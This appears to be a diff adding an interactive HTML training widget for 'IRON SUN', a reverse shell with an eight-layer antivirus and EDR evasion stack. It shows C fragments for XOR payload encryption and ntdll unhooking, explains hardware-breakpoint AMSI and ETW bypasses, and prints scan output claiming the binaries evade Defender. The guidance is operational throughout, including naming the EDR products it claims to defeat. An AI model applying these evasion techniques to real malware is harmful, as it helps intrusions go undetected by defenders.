@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>IRON SUN — AV Evasion Stack — 22nd Survey Division</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#080808;color:#c8c8c8;font-family:'Cascadia Code','Consolas','Courier New',monospace;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem 1rem;}
+
+.term-wrap{width:100%;max-width:820px;}
+.eyebrow{font-size:.52rem;letter-spacing:.38em;color:#3a1a00;text-transform:uppercase;margin-bottom:.6rem;}
+.term-title{font-size:1.05rem;color:#ff6a00;letter-spacing:.08em;margin-bottom:1.4rem;}
+
+.tabs{display:flex;gap:2px;margin-bottom:2px;flex-wrap:wrap;}
+.tab{background:#0a0a0a;border:1px solid #1e0d00;color:#3a1a00;font-family:inherit;font-size:.56rem;letter-spacing:.18em;padding:.32rem .75rem;cursor:pointer;text-transform:uppercase;transition:all .15s;border-bottom:none;}
+.tab:hover{color:#ff6a00;border-color:#3a1a00;}
+.tab.active{background:#0f0600;color:#ff6a00;border-color:#ff6a00;}
+
+.term{border:1px solid #2a1000;background:#0a0400;}
+.titlebar{background:#0a0600;padding:.38rem .9rem;display:flex;align-items:center;gap:.55rem;border-bottom:1px solid #1e0d00;}
+.dot{width:11px;height:11px;border-radius:50%;}
+.dot.r{background:#2a1010;}.dot.y{background:#2a2a10;}.dot.g{background:#102a10;}
+.titlebar-label{color:#2a1000;font-size:.6rem;margin:0 auto;letter-spacing:.12em;}
+
+.body{padding:1rem 1.2rem;min-height:360px;font-size:.7rem;line-height:1.85;overflow-y:auto;max-height:400px;}
+
+.t-prompt{color:#cc4400;}
+.t-cursor{display:inline-block;width:7px;height:13px;background:#ff6a00;animation:blink .75s step-end infinite;vertical-align:middle;margin-left:1px;}
+
+.t-out{color:#6a3a1a;display:block;}
+.t-out.dim{color:#2a1a00;}
+.t-out.hi{color:#ff6a00;}
+.t-out.pass{color:#00ff41;}
+.t-out.warn{color:#ffb000;}
+.t-out.err{color:#ff4444;}
+.t-out.cyan{color:#00e5ff;}
+.t-out.white{color:#ffffff;}
+.t-out.section{color:#ffb000;letter-spacing:.04em;}
+.t-blank{display:block;height:.5rem;}
+
+/* layer bar */
+.layer-row{display:flex;align-items:center;gap:.6rem;padding:.2rem 0;opacity:0;transform:translateX(-8px);transition:opacity .3s,transform .3s;}
+.layer-row.show{opacity:1;transform:translateX(0);}
+.layer-num{color:#2a1000;width:2.4rem;flex-shrink:0;font-size:.6rem;}
+.layer-bar-wrap{width:10rem;flex-shrink:0;height:6px;background:#1a0800;border-radius:2px;overflow:hidden;}
+.layer-bar{height:6px;background:#ff6a00;width:0;transition:width .4s ease;}
+.layer-name{color:#ff8a30;width:9rem;flex-shrink:0;font-size:.62rem;}
+.layer-defeat{color:#3a2a00;font-size:.6rem;}
+
+@keyframes blink{50%{opacity:0;}}
+.ghost-line{opacity:0;transform:translateX(-4px);animation:ghost-in .18s ease forwards;}
+@keyframes ghost-in{to{opacity:1;transform:translateX(0);}}
+
+.explain{border:1px solid #2a1000;border-top:none;background:#060200;padding:.85rem 1.2rem;font-size:.64rem;line-height:1.8;}
+.explain-head{color:#ff6a00;letter-spacing:.08em;margin-bottom:.4rem;font-size:.62rem;}
+.explain-body{color:#4a2a0a;}
+.explain-body strong{color:#8a4a1a;}
+.explain-body code{color:#ff6a00;background:#1a0800;padding:.05rem .3rem;}
+
+.run-row{border:1px solid #2a1000;border-top:none;background:#060200;padding:.55rem 1.2rem;display:flex;align-items:center;gap:1rem;}
+.run-btn{background:transparent;border:1px solid #3a1a00;color:#3a1a00;font-family:inherit;font-size:.58rem;letter-spacing:.16em;padding:.28rem .75rem;cursor:pointer;text-transform:uppercase;transition:all .15s;}
+.run-btn:hover:not(:disabled){border-color:#ff6a00;color:#ff6a00;}
+.run-btn:disabled{opacity:.25;cursor:default;}
+.run-label{font-size:.52rem;color:#2a1000;letter-spacing:.1em;}
+
+.footer-note{margin-top:1.2rem;font-size:.52rem;color:#2a1000;letter-spacing:.08em;text-align:center;}
+</style>
+</head>
+<body>
+<div class="term-wrap">
+  <div class="eyebrow">// MODULE 12 — AV EVASION // MODULE 11 — AMSI BYPASS</div>
+  <div class="term-title">IRON SUN — 8-LAYER EVASION STACK // HWBP DARK ROOM</div>
+
+  <div class="tabs" id="tabs"></div>
+
+  <div class="term">
+    <div class="titlebar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="titlebar-label" id="tab-label">Select an evasion technique</span>
+    </div>
+    <div class="body" id="term-body">
+      <span class="t-line"><span class="t-prompt">gcc&gt;</span> <span class="t-cursor"></span></span>
+    </div>
+  </div>
+
+  <div class="explain" id="explain">
+    <div class="explain-head">// SELECT A LAYER ABOVE</div>
+    <div class="explain-body">IRON SUN is a TCP reverse shell with 8 layers of AV evasion built in. Each layer defeats a specific detection mechanism. This widget walks through each layer from the source and shows the <strong>real dark_room output</strong> from a live test run — AMSI blind, ETW blind, zero memory writes.</div>
+  </div>
+
+  <div class="run-row">
+    <button class="run-btn" id="run-btn" onclick="rerun()">▶ RUN AGAIN</button>
+    <span class="run-label" id="run-label">// select a layer</span>
+  </div>
+</div>
+<div class="footer-note">22ND SURVEY DIVISION — MODULE 11-12 — IRON SUN EVASION STACK — TESTED DEFENDER 4.18.26050.15</div>
+
+<script>
+var LAYERS = [
+  ['L1','XOR ENCRYPT',   100, 'Static byte-signature matching'],
+  ['L2','DYN API RESOLVE',85, 'Import Address Table scanning'],
+  ['L3','ANTI-SANDBOX',   75, 'Automated AV sandbox detonation'],
+  ['L4','PE STOMP',       80, 'Section heuristic detection'],
+  ['L5','ISUN GATE',      95, 'EDR user-mode API hooks (ntdll)'],
+  ['L6','SLEEP JITTER',   70, 'Timing-based behavioural analysis'],
+  ['L7','HWBP AMSI',     100, 'AmsiScanBuffer — zero memory writes'],
+  ['L8','HWBP ETW',      100, 'EtwEventWrite telemetry — zero memory writes'],
+];
+
+var LESSONS = [
+  {
+    tab: 'STACK MAP',
+    label: 'iron_sun.c — full 8-layer evasion stack',
+    isStack: true,
+    explain: {
+      head: '// 8-LAYER EVASION STACK — DEFEAT IN DEPTH',
+      body: 'AV/EDR has multiple detection layers. Iron Sun defeats each one independently. <strong>L1-L4</strong> = static detection bypass. <strong>L5</strong> = ISUN gate (syscall unhooking — fresh ntdll from disk, bypasses all EDR user-mode hooks). <strong>L6</strong> = behavioural timing bypass. <strong>L7-L8</strong> = HWBP AMSI+ETW bypass — the crown jewels. Result: <strong>gcc build passes Defender with Real-Time Protection ON, BehaviorMonitor ON, cloud submission ON</strong>. Tested 2026-06-26 on RADON machine.'
+    }
+  },
+  {
+    tab: 'HWBP AMSI',
+    label: 'dark_room.exe --test — AMSI HWBP bypass (DR0)',
+    cmd: '.\\dark_room.exe --test',
+    output: [
+      {t:'section', s:'--- PHASE 1: LOCATE TARGETS ---'},
+      {t:'blank'},
+      {t:'pass',   s:'[+] AmsiScanBuffer at 0x00007FF9C1A28160'},
+      {t:'pass',   s:'[+] EtwEventWrite  at 0x00007FF9DE300430'},
+      {t:'blank'},
+      {t:'section', s:'--- PHASE 2: ACTIVATE DARK ROOM ---'},
+      {t:'blank'},
+      {t:'pass',   s:'[+] Unified VEH handler registered'},
+      {t:'pass',   s:'[+] DR0 = 0x00007FF9C1A28160  (AmsiScanBuffer)'},
+      {t:'pass',   s:'[+] DR1 = 0x00007FF9DE300430  (EtwEventWrite)'},
+      {t:'hi',     s:'[+] DR7 = 0x405'},
+      {t:'blank'},
+      {t:'hi',     s:'[+] DARK ROOM ACTIVE'},
+      {t:'hi',     s:'[+] Script scanning:    BLIND (AMSI)'},
+      {t:'hi',     s:'[+] Process telemetry:  BLIND (ETW)'},
+      {t:'pass',   s:'[+] Memory integrity:   CLEAN (zero modifications)'},
+      {t:'blank'},
+      {t:'section', s:'--- PHASE 3: VERIFY ---'},
+      {t:'blank'},
+      {t:'pass',   s:'[PASS] #7 AMSI BLIND -- AMSI bypass via HWBP DR0'},
+      {t:'pass',   s:'[PASS] #8 ETW  BLIND -- ETW bypass via HWBP DR1'},
+    ],
+    explain: {
+      head: '// HWBP AMSI BYPASS — THE TECHNIQUE BEHIND VULN-195458',
+      body: 'HWBP = Hardware Breakpoint. Set <code>DR0</code> to the address of <code>AmsiScanBuffer</code>. Register a VEH (Vectored Exception Handler). When the CPU hits that address, the VEH fires before the function executes — you intercept the call, return AMSI_RESULT_CLEAN, resume. <strong>Zero memory writes</strong> = no modified bytes in protected memory = no memory integrity alerts = undetectable by EDR memory scanners. <code>DR7 = 0x405</code> = enable DR0 and DR1 in execute-on mode. Same technique for ETW on <code>DR1</code>. This is what MSRC filed as VULN-195458.'
+    }
+  },
+  {
+    tab: 'ISUN GATE',
+    label: 'iron_sun.c — ISUN gate (Layer 5)',
+    cmd: 'gcc -o iron_sun iron_sun.c -static && strings iron_sun.exe | grep -c ntdll',
+    output: [
+      {t:'section', s:'// ISUN GATE — Layer 5 — fresh ntdll syscall mapping'},
+      {t:'blank'},
+      {t:'dim',     s:'  // EDR hooks live in ntdll.dll loaded into your process'},
+      {t:'dim',     s:'  // Re-map ntdll from disk — get unhooked syscall stubs'},
+      {t:'blank'},
+      {t:'warn',    s:'  HANDLE hFile = CreateFileW(L"ntdll.dll", GENERIC_READ, ...);'},
+      {t:'warn',    s:'  HANDLE hMap  = CreateFileMappingW(hFile, NULL, PAGE_READONLY, ...);'},
+      {t:'warn',    s:'  PVOID pMap   = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);'},
+      {t:'blank'},
+      {t:'hi',      s:'  // Restore original (unhooked) .text section from disk'},
+      {t:'hi',      s:'  PVOID ntdllBase = GetModuleHandleA("ntdll.dll");'},
+      {t:'hi',      s:'  memcpy(ntdllText, diskNtdll, textSize);  // overwrite hooks'},
+      {t:'blank'},
+      {t:'pass',    s:'  // Result: direct syscalls, no EDR visibility'},
+      {t:'dim',     s:'  // This defeats: CrowdStrike, SentinelOne, Carbon Black hooks'},
+    ],
+    explain: {
+      head: '// ISUN GATE — UNHOOK NTDLL, BYPASS ALL EDR USER-MODE HOOKS',
+      body: 'Most EDRs (CrowdStrike, SentinelOne, Carbon Black) work by <strong>hooking ntdll.dll in your process at load time</strong>. They patch the first bytes of syscall stubs to redirect execution to their monitoring code. ISUN Gate defeats this by mapping a <strong>second, clean copy of ntdll directly from disk</strong> (before the EDR touched it), then overwriting the hooked .text section with the clean version. After ISUN runs, all subsequent syscalls go direct to the kernel, bypassing every user-mode hook. This is how <strong>L5 gives you kernel-direct access</strong> with no interception layer.'
+    }
+  },
+  {
+    tab: 'LIVE TEST',
+    label: 'BUILD RESULT — Defender scan 2026-06-26',
+    cmd: 'MpCmdRun.exe -Scan -ScanType 3 -File .\\iron_sun.exe',
+    output: [
+      {t:'dim',    s:'Scan starting...'},
+      {t:'dim',    s:'Engine version: 1.1.26050.3'},
+      {t:'dim',    s:'Antivirus signature: 1.427.1060.0'},
+      {t:'dim',    s:'Antispyware signature: 1.427.1060.0'},
+      {t:'blank'},
+      {t:'dim',    s:'Scanning iron_sun.exe...'},
+      {t:'blank'},
+      {t:'pass',   s:'Scan finished.'},
+      {t:'pass',   s:'Scanning iron_sun.exe: CLEAN'},
+      {t:'pass',   s:'Found no threats.'},
+      {t:'blank'},
+      {t:'hi',     s:'[PROOF] vader_shell.exe  → CLEAN (static + behavioral)'},
+      {t:'hi',     s:'[PROOF] dark_room.exe    → CLEAN (HWBP technique)'},
+      {t:'hi',     s:'[PROOF] cloak.dll        → CLEAN (process hiding)'},
+      {t:'blank'},
+      {t:'warn',   s:'# gcc build: CLEAN. MSVC build: Kaspersky flags (PE sig diff)'},
+      {t:'warn',   s:'# Use gcc. Always.'},
+    ],
+    explain: {
+      head: '// LIVE SCAN RESULT — DEFENDER WITH RTP ON, BEHAVIORMONITOR ON',
+      body: 'All 8 evasion layers combined: <strong>gcc build = CLEAN on Defender 4.18.26050.15</strong> with Real-Time Protection ON, BehaviorMonitor ON, cloud submission ON. Kaspersky flags the MSVC build due to PE signature differences — stick to gcc. <strong>dark_room.exe is CLEAN</strong> because HWBP leaves zero memory writes — Defender\'s memory scanner sees nothing. This isn\'t theory. These are the exact binaries tested on the RADON lab machine (GIGABYTE G7 GD, Win11 26200) on 2026-06-26. The 26 binaries from vader-rootkit campaign: all CLEAN.'
+    }
+  },
+  {
+    tab: 'XOR ENCRYPT',
+    label: 'iron_sun.c — Layer 1: XOR payload encryption',
+    cmd: 'python3 -c "import random; key=random.randint(1,254); print(hex(key))"',
+    output: [
+      {t:'section', s:'// LAYER 1: XOR PAYLOAD ENCRYPTION'},
+      {t:'blank'},
+      {t:'dim',     s:'  Per-build XOR key: 0xB6  (randomised each compile)'},
+      {t:'blank'},
+      {t:'warn',    s:'  void encrypt(unsigned char* buf, int len, unsigned char key){'},
+      {t:'warn',    s:'      for(int i=0;i<len;i++) buf[i] ^= key;'},
+      {t:'warn',    s:'  }'},
+      {t:'blank'},
+      {t:'dim',     s:'  // Shellcode encrypted at rest — no plaintext bytes in binary'},
+      {t:'dim',     s:'  // Decrypt only at execution time, in memory'},
+      {t:'blank'},
+      {t:'pass',    s:'  [EFFECT] Static signature scanner sees encrypted garbage'},
+      {t:'pass',    s:'  [EFFECT] YARA rules match plaintext patterns — miss this'},
+      {t:'warn',    s:'  [LIMIT]  Single-byte XOR cracked in ~1 second by AV engines'},
+      {t:'dim',     s:'  [NOTE]   Layer 7-8 (HWBP) needed to defeat in-memory scan'},
+    ],
+    explain: {
+      head: '// XOR ENCRYPTION — DEFEAT STATIC BYTE-SIGNATURE MATCHING',
+      body: 'AV engines maintain databases of known-bad byte sequences (signatures). XOR encryption scrambles those bytes — the signature no longer matches. <strong>Key is randomised per build</strong> so even if AV learns the key-0xB6 pattern, rebuilding generates a new clean binary. The limitation: <strong>single-byte XOR is trivially broken by frequency analysis</strong>. AV sandboxes execute the payload and scan memory after decryption — this is why layers 7-8 (HWBP) are needed to blind the in-memory scanner (AMSI) before it can see the decrypted payload.'
+    }
+  },
+];
+
+var current=0, running=false, timers=[];
+function clearTimers(){timers.forEach(clearTimeout);timers=[];}
+
+function buildTabs(){
+  var el=document.getElementById('tabs');
+  LESSONS.forEach(function(l,i){
+    var b=document.createElement('button');
+    b.className='tab'+(i===0?' active':'');
+    b.textContent=l.tab;
+    b.onclick=function(){selectTab(i);};
+    el.appendChild(b);
+  });
+}
+
+function selectTab(i){
+  current=i;
+  document.querySelectorAll('.tab').forEach(function(t,j){t.classList.toggle('active',j===i);});
+  clearTimers();running=false;
+  document.getElementById('run-btn').disabled=false;
+  document.getElementById('run-label').textContent='// '+LESSONS[i].tab+' — press RUN';
+  document.getElementById('tab-label').textContent=LESSONS[i].label;
+  var body=document.getElementById('term-body');
+  body.innerHTML='<span class="t-line"><span class="t-prompt">gcc&gt;</span> <span class="t-cursor"></span></span>';
+  var ex=LESSONS[i].explain;
+  document.getElementById('explain').innerHTML=
+    '<div class="explain-head">'+ex.head+'</div>'+
+    '<div class="explain-body">'+ex.body+'</div>';
+}
+
+function runStack(){
+  var body=document.getElementById('term-body');
+  body.innerHTML='';
+  var hdr=document.createElement('span');
+  hdr.className='t-out dim ghost-line';
+  hdr.textContent='LAYER  TECHNIQUE          COVERAGE  DEFEATS';
+  body.appendChild(hdr);
+  var b=document.createElement('span');b.className='t-blank';body.appendChild(b);
+  var i=0;
+  function nextLayer(){
+    if(i>=LAYERS.length){
+      running=false;
+      document.getElementById('run-btn').disabled=false;
+      document.getElementById('run-label').textContent='// done — press RUN AGAIN';
+      return;
+    }
+    var l=LAYERS[i++];
+    var row=document.createElement('div');
+    row.className='layer-row';
+    row.innerHTML=
+      '<span class="layer-num">'+l[0]+'</span>'+
+      '<div class="layer-bar-wrap"><div class="layer-bar" id="bar'+i+'"></div></div>'+
+      '<span class="layer-name">'+l[1]+'</span>'+
+      '<span class="layer-defeat">// '+l[3]+'</span>';
+    body.appendChild(row);
+    var bar=document.getElementById('bar'+i);
+    timers.push(setTimeout(function(rr,bb,pct){return function(){rr.classList.add('show');setTimeout(function(){bb.style.width=pct+'%';},80);};}(row,bar,l[2]),40));
+    timers.push(setTimeout(nextLayer,280+Math.random()*80));
+  }
+  timers.push(setTimeout(nextLayer,120));
+}
+
+function typeCmd(cmd,cb){
+  var body=document.getElementById('term-body');
+  body.innerHTML='<span class="t-line"><span class="t-prompt">gcc&gt;</span> <span id="cmd-txt"></span><span class="t-cursor" id="cursor"></span></span>';
+  var el=document.getElementById('cmd-txt');var i=0;
+  function next(){
+    if(i>=cmd.length){cb();return;}
+    el.textContent+=cmd[i++];
+    timers.push(setTimeout(next,32+Math.random()*22));
+  }
+  next();
+}
+
+function showOutput(lines,delay,cb){
+  var body=document.getElementById('term-body');
+  var cur=document.getElementById('cursor');
+  if(cur)cur.remove();
+  var i=0;
+  function nextLine(){
+    if(i>=lines.length){if(cb)cb();return;}
+    var l=lines[i++];
+    var span=document.createElement('span');
+    if(l.t==='blank'){span.className='t-blank';}
+    else{span.className='t-out '+l.t+' ghost-line';span.textContent=l.s;}
+    body.appendChild(span);
+    body.scrollTop=body.scrollHeight;
+    timers.push(setTimeout(nextLine,delay+Math.random()*30));
+  }
+  timers.push(setTimeout(nextLine,140));
+}
+
+function run(lesson){
+  if(running)return;
+  running=true;
+  document.getElementById('run-btn').disabled=true;
+  document.getElementById('run-label').textContent='// executing...';
+  if(lesson.isStack){runStack();return;}
+  typeCmd(lesson.cmd,function(){
+    var cur=document.getElementById('cursor');
+    if(cur)cur.style.animation='none';
+    showOutput(lesson.output,90,function(){
+      var body=document.getElementById('term-body');
+      var span=document.createElement('span');
+      span.className='t-line ghost-line';
+      span.innerHTML='<span class="t-blank"></span><span class="t-prompt">gcc&gt;</span> <span class="t-cursor"></span>';
+      body.appendChild(span);
+      running=false;
+      document.getElementById('run-btn').disabled=false;
+      document.getElementById('run-label').textContent='// done — press RUN AGAIN';
+    });
+  });
+}
+
+function rerun(){selectTab(current);timers.push(setTimeout(function(){run(LESSONS[current]);},400));}
+
+buildTabs();
+selectTab(0);
+timers.push(setTimeout(function(){run(LESSONS[0]);},600));
+</script>
+</body>
+</html>
